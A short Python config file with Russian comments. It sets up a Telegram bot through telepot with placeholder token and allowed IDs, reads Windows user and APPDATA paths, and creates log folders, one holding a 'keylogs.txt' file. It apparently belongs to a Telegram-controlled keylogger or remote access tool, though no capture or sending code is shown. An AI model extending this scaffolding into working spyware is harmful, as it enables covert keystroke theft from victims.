import os
import telepot

# === Основные настройки ===
KNOWN_IDS = ['ids', 'ids']
TOKEN = 'id'
bot = telepot.Bot(TOKEN)

# === Пути ===
USER = os.environ.get("USERNAME")
APPDATA = os.environ.get("APPDATA")
BASE_DIR = os.getcwd()
LOG_DIR = os.path.join(BASE_DIR, 'logs')
SCRIPTS_DIR = os.path.join(BASE_DIR, 'scripts')

# === Файлы логов ===
LOG_FILE = os.path.join(LOG_DIR, 'user_log.txt')
KEYLOG_FILE = os.path.join(LOG_DIR, 'keylogs.txt')

# === Убедимся, что папки существуют ===
os.makedirs(LOG_DIR, exist_ok=True)
os.makedirs(SCRIPTS_DIR, exist_ok=True)
